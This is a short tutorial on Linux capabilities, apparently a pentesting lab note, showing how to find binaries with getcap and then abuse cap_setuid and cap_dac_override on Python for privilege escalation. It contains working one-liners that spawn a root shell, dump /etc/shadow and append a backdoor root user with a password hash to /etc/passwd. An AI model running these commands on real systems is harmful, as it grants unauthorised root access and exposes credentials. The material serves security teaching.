Linux Capabilities
                            
Linux capabilities are a security feature that allows fine-grained control over root privileges. Instead of granting a process full root access, specific privileges can be assigned, limiting potential security risks.

1. Checking Capabilities of a Binary
To check if a binary has any special capabilities assigned:
```
getcap /usr/bin/ping
```
2. Finding All Binaries with Capabilities
To list all files that have capabilities assigned:
```
getcap -r / 2>/dev/null
```

 Exploiting Capabilities for Privilege Escalation
 
4.1 Exploiting cap_setuid (Set User ID)
If cap_setuid+ep is granted to a binary like Python, it can be used to escalate privileges:

Granting the Capability
```
setcap cap_setuid+ep /usr/bin/python3.9
```
Finding Binaries with this Capability
```
getcap -r / 2>/dev/null
```
Confirming the Capability is Applied
```
getcap /usr/bin/python3.9
```
Exploiting Python3.9 for Privilege Escalation
```
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Removing the Capability (For Security)
```
setcap -r /usr/bin/python3.9
```
4.2 Exploiting cap_dac_override (Bypass File Permissions)
If a binary has cap_dac_override+ep, it can read sensitive files like /etc/shadow.

Checking File Permissions
```
ls -l /etc/shadow
cat /etc/shadow
```
Granting the Capability
```
setcap cap_dac_override+ep /usr/bin/python3.9
```
Finding Binaries with this Capability
```
getcap -r / 2>/dev/null
```
Confirming the Capability is Applied
```
getcap /usr/bin/python3.9
```
Reading Sensitive Files Using Python
```
/usr/bin/python3.9 -c 'print(open("/etc/shadow").read())'
python3 -c 'print(open("/etc/shadow").read())'
```
Appending a New Root User to /etc/passwd
```
/usr/bin/python3.9 -c 'open("/etc/passwd", "a").write("root2:$1$jJQZ0icg5UMXbDzX.tkUwZ8pyY9sQy.:0:0:root:/root:/bin/bash\n")'
```
Removing the Capability
```
setcap -r /usr/bin/python3.9
```
